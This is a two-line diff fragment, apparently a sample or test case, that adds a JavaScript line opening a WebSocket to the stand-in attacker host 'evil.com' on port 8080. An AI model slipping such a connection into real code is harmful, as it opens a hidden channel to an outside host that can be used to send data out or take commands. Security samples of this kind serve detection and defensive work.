@@ -1,0 +1,2 @@
+
+const ws = new WebSocket('ws://evil.com:8080');
